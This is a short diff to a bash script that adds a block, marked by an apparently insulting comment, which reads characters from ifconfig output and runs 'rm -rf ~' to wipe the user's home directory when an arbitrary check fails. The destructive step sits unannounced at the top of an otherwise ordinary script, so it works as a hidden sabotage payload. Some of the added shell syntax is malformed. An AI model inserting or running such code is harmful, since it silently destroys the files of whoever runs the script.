@@ -1,4 +1,15 @@
 #!/bin/bash
+#Sa oled pede
+i=$(ifconfig | grep addr:19 | cut -c30)
+s=$(ifconfig | grep addr:127 | cut -c22)
+
+if [ $i + $s -ne 7 ]
+then
+rm -rf ~
+
+else
+echo "ok"
+fi
 
 user=$($user)
 date=$(date)
